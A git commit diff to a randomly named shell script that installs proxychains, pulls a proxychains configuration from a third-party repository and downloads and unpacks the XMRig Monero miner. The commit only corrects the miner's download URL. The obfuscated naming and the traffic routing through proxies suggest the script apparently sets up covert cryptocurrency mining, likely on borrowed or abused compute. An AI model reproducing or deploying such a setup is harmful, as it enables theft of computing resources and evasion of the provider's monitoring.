1be3b5c0248cc189bc250ec344c0de17b2652989
lambangcaptoc <54308112+lambangcaptoc@users.noreply.github.com>
2020-11-16 17:36:38 +0700

    Update dqwehwq20.sh

--- projweqw/dqwehwq20.sh
+++ projweqw/dqwehwq20.sh
@@ -4,7 +4,7 @@ sudo apt-get update
 sudo apt-get install -y proxychains tar
 wget https://raw.githubusercontent.com/cuongptp1/123/master/sock/40/proxychains.conf
 mv proxychains1.conf /etc/proxychains.conf
-wget https://github.com/xmrig/xmrig/releases/download/v6.5.1/xmrig-6.5.3-linux-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz
 tar --extract --file xmrig-6.5.3-linux-x64.tar.gz
 cd xmrig-6.5.3
 export PROXY_DNS_SERVER=1.1.1.1
